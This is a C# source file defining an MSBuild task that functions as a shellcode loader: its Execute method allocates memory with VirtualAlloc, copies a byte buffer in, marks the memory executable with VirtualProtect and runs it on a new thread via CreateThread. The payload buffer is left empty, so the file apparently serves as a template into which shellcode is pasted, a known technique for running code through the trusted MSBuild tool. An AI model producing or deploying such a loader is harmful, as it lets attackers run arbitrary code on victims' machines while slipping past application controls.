using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

namespace MSBuild
{
    public class ClassExample : Task, ITask
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(
                IntPtr lpAddress,
                UInt32 dwSize,
                UInt32 flNewProtect,
                out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        public override bool Execute()
        {
            byte[] buf = {};
            
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x1000, 0x04);
            Marshal.Copy(buf, 0, addr, size);
            UInt32 oldProtect = 0;
            VirtualProtect(addr, (uint)size, 0x20, out oldProtect);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);            
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
        }
    }
}
